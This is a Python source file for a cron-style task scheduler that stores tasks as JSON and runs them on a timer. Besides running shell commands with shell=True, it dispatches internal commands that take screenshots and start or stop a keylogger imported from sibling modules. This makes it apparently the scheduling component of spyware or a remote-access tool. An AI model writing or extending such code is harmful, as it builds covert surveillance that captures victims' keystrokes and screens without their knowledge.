from __future__ import annotations
import os
import sys
import time
import json
import threading
import datetime
import subprocess
import logging
from pathlib import Path
from typing import Dict, List, Optional, Any, Union, Callable
from dataclasses import dataclass, field

@dataclass
class Task:
    """Task information class"""
    name: str
    command: Union[str, Dict[str, Any]]
    schedule: str  # Cron expression
    repeat: bool = True
    last_run: Optional[str] = None
    next_run: Optional[datetime.datetime] = None
    active: bool = True
    retries: int = 0
    max_retries: int = 3
    timeout: int = 300  # 5 minutes
    lock: threading.Lock = field(default_factory=threading.Lock)
    
    def __post_init__(self) -> None:
        """Validate task data after initialization"""
        self._validate_task()
        
    def _validate_task(self) -> None:
        """Validate task fields"""
        if not self.name or not isinstance(self.name, str):
            raise ValueError("Invalid task name")
            
        if not self.command:
            raise ValueError("Missing task command")
            
        if not self.schedule or not isinstance(self.schedule, str):
            raise ValueError("Invalid schedule expression")
            
        # Validate cron expression
        try:
            from croniter import croniter
            if not croniter.is_valid(self.schedule):
                raise ValueError("Invalid cron expression")
        except ImportError:
            pass  # Skip validation if croniter not available
            
    def to_dict(self) -> Dict[str, Any]:
        """Convert task to dictionary

        Returns:
            Dict[str, Any]: Task data
        """
        return {
            'name': self.name,
            'command': self.command,
            'schedule': self.schedule,
            'repeat': self.repeat,
            'last_run': self.last_run,
            'next_run': str(self.next_run) if self.next_run else None,
            'active': self.active,
            'retries': self.retries,
            'max_retries': self.max_retries,
            'timeout': self.timeout
        }
        
    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> 'Task':
        """Create task from dictionary

        Args:
            data (Dict[str, Any]): Task data

        Returns:
            Task: Task instance
        """
        task = cls(
            name=data['name'],
            command=data['command'],
            schedule=data['schedule'],
            repeat=data.get('repeat', True),
            max_retries=data.get('max_retries', 3),
            timeout=data.get('timeout', 300)
        )
        task.last_run = data.get('last_run')
        if data.get('next_run'):
            task.next_run = datetime.datetime.strptime(
                data['next_run'],
                '%Y-%m-%d %H:%M:%S'
            )
        task.active = data.get('active', True)
        task.retries = data.get('retries', 0)
        return task

class Scheduler:
    def __init__(self, task_dir: str = "tasks") -> None:
        """Initialize scheduler

        Args:
            task_dir (str, optional): Directory for task files. Defaults to "tasks".
        """
        self.task_dir = Path(task_dir)
        self.tasks: Dict[str, Task] = {}
        self.running = False
        self.lock = threading.Lock()
        self.logger = logging.getLogger(__name__)
        self.cleanup_interval = 3600  # 1 hour
        self.last_cleanup = 0
        
        # Create task directory
        self.task_dir.mkdir(parents=True, exist_ok=True)
        
        # Load saved tasks
        self.load_tasks()
        
    def start(self) -> bool:
        """Start the scheduler

        Returns:
            bool: True if started successfully
        """
        if self.running:
            return False
            
        try:
            with self.lock:
                self.running = True
                
            # Start scheduler thread
            self.scheduler_thread = threading.Thread(target=self._run)
            self.scheduler_thread.daemon = True
            self.scheduler_thread.start()
            
            self.logger.info("Scheduler started")
            return True
            
        except Exception as e:
            self.logger.error(f"Error starting scheduler: {str(e)}")
            self.running = False
            return False
            
    def stop(self) -> None:
        """Stop the scheduler"""
        try:
            with self.lock:
                self.running = False
                
            # Wait for running tasks
            self.cleanup()
            
            # Save final state
            self.save_tasks()
            
            self.logger.info("Scheduler stopped")
            
        except Exception as e:
            self.logger.error(f"Error stopping scheduler: {str(e)}")
            
    def add_task(self, name: str, command: Union[str, Dict[str, Any]], 
                 schedule: str, repeat: bool = True, max_retries: int = 3,
                 timeout: int = 300) -> bool:
        """Add new task

        Args:
            name (str): Task name
            command (Union[str, Dict[str, Any]]): Command to execute
            schedule (str): Cron schedule expression
            repeat (bool, optional): Whether to repeat. Defaults to True.
            max_retries (int, optional): Maximum retry attempts. Defaults to 3.
            timeout (int, optional): Command timeout in seconds. Defaults to 300.

        Returns:
            bool: True if task added successfully
        """
        try:
            with self.lock:
                if name in self.tasks:
                    raise ValueError(f"Task '{name}' already exists")
                    
                # Create and validate task
                task = Task(
                    name=name,
                    command=command,
                    schedule=schedule,
                    repeat=repeat,
                    max_retries=max_retries,
                    timeout=timeout
                )
                
                # Calculate next run time
                self._update_next_run(task)
                
                self.tasks[name] = task
                self.save_tasks()
                
                self.logger.info(f"Added task: {name}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error adding task: {str(e)}")
            return False
            
    def remove_task(self, name: str) -> bool:
        """Remove task

        Args:
            name (str): Task name

        Returns:
            bool: True if removed successfully
        """
        try:
            with self.lock:
                if name not in self.tasks:
                    return False
                    
                # Stop task if running
                task = self.tasks[name]
                task.active = False
                
                # Remove task
                del self.tasks[name]
                self.save_tasks()
                
                # Delete task file
                task_file = self.task_dir / f"{name}.json"
                if task_file.exists():
                    task_file.unlink()
                    
                self.logger.info(f"Removed task: {name}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error removing task: {str(e)}")
            return False
            
    def enable_task(self, name: str) -> bool:
        """Enable task

        Args:
            name (str): Task name

        Returns:
            bool: True if enabled successfully
        """
        try:
            with self.lock:
                if name not in self.tasks:
                    return False
                    
                task = self.tasks[name]
                if task.active:
                    return True
                    
                task.active = True
                task.retries = 0
                self._update_next_run(task)
                
                self.save_tasks()
                self.logger.info(f"Enabled task: {name}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error enabling task: {str(e)}")
            return False
            
    def disable_task(self, name: str) -> bool:
        """Disable task

        Args:
            name (str): Task name

        Returns:
            bool: True if disabled successfully
        """
        try:
            with self.lock:
                if name not in self.tasks:
                    return False
                    
                task = self.tasks[name]
                task.active = False
                task.next_run = None
                
                self.save_tasks()
                self.logger.info(f"Disabled task: {name}")
                return True
                
        except Exception as e:
            self.logger.error(f"Error disabling task: {str(e)}")
            return False
            
    def _run(self) -> None:
        """Main scheduler loop"""
        while self.running:
            try:
                now = datetime.datetime.now()
                
                with self.lock:
                    # Check each task
                    for task in self.tasks.values():
                        if not task.active or not task.next_run:
                            continue
                            
                        if now >= task.next_run:
                            # Execute task
                            success = self._execute_task(task)
                            
                            with task.lock:
                                task.last_run = str(now)
                                
                                if success:
                                    task.retries = 0
                                    if task.repeat:
                                        self._update_next_run(task)
                                    else:
                                        task.active = False
                                        task.next_run = None
                                else:
                                    task.retries += 1
                                    if task.retries >= task.max_retries:
                                        task.active = False
                                        task.next_run = None
                                        self.logger.error(
                                            f"Task {task.name} disabled after {task.retries} failed attempts"
                                        )
                                        
                    self.save_tasks()
                    
                # Periodic cleanup
                if time.time() - self.last_cleanup >= self.cleanup_interval:
                    self.cleanup()
                    
            except Exception as e:
                self.logger.error(f"Scheduler error: {str(e)}")
                
            time.sleep(1)
            
    def _execute_task(self, task: Task) -> bool:
        """Execute a task

        Args:
            task (Task): Task to execute

        Returns:
            bool: True if execution successful
        """
        try:
            # Parse command
            if isinstance(task.command, str):
                # Shell command
                proc = subprocess.Popen(
                    task.command,
                    shell=True,
                    stdin=subprocess.DEVNULL,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                
                try:
                    stdout, stderr = proc.communicate(timeout=task.timeout)
                    if proc.returncode != 0:
                        raise Exception(f"Command failed: {stderr.decode()}")
                except subprocess.TimeoutExpired:
                    proc.kill()
                    raise Exception("Command timed out")
                    
            elif isinstance(task.command, dict):
                # Internal command
                cmd_type = task.command.get('type')
                args = task.command.get('args', [])
                
                if cmd_type == 'screenshot':
                    self._take_screenshot()
                elif cmd_type == 'keylogger':
                    self._toggle_keylogger(args[0])
                else:
                    raise ValueError(f"Unknown command type: {cmd_type}")
                    
            self.logger.info(f"Executed task: {task.name}")
            return True
            
        except Exception as e:
            self.logger.error(f"Error executing task '{task.name}': {str(e)}")
            return False
            
    def _update_next_run(self, task: Task) -> None:
        """Update task next run time"""
        try:
            from croniter import croniter
            base = datetime.datetime.now()
            iterator = croniter(task.schedule, base)
            task.next_run = iterator.get_next(datetime.datetime)
        except Exception as e:
            self.logger.error(f"Error updating next run for {task.name}: {str(e)}")
            task.next_run = None
            
    def load_tasks(self) -> None:
        """Load tasks from files"""
        try:
            for task_file in self.task_dir.glob('*.json'):
                try:
                    with open(task_file) as f:
                        data = json.load(f)
                    task = Task.from_dict(data)
                    self.tasks[task.name] = task
                except Exception as e:
                    self.logger.error(f"Error loading task {task_file}: {str(e)}")
                    
            self.logger.info(f"Loaded {len(self.tasks)} tasks")
            
        except Exception as e:
            self.logger.error(f"Error loading tasks: {str(e)}")
            
    def save_tasks(self) -> None:
        """Save tasks to files"""
        try:
            for name, task in self.tasks.items():
                try:
                    task_file = self.task_dir / f"{name}.json"
                    with open(task_file, 'w') as f:
                        json.dump(task.to_dict(), f, indent=2)
                except Exception as e:
                    self.logger.error(f"Error saving task {name}: {str(e)}")
                    
        except Exception as e:
            self.logger.error(f"Error saving tasks: {str(e)}")
            
    def cleanup(self) -> None:
        """Clean up tasks and resources"""
        try:
            with self.lock:
                # Remove completed one-time tasks
                for name in list(self.tasks.keys()):
                    task = self.tasks[name]
                    if not task.repeat and not task.active:
                        self.remove_task(name)
                        
                # Update last cleanup time
                self.last_cleanup = time.time()
                
            self.logger.info("Scheduler cleaned up")
            
        except Exception as e:
            self.logger.error(f"Cleanup error: {str(e)}")
            
    def _take_screenshot(self) -> None:
        """Helper to take screenshot"""
        try:
            from .screenshot import Screenshot
            Screenshot().capture()
        except Exception as e:
            self.logger.error(f"Screenshot error: {str(e)}")
            raise
            
    def _toggle_keylogger(self, action: str) -> None:
        """Helper to control keylogger

        Args:
            action (str): Action to perform (start/stop)
        """
        try:
            from .keylogger import Keylogger
            keylogger = Keylogger()
            if action == 'start':
                keylogger.start()
            elif action == 'stop':
                keylogger.stop()
            else:
                raise ValueError(f"Invalid keylogger action: {action}")
        except Exception as e:
            self.logger.error(f"Keylogger error: {str(e)}")
            raise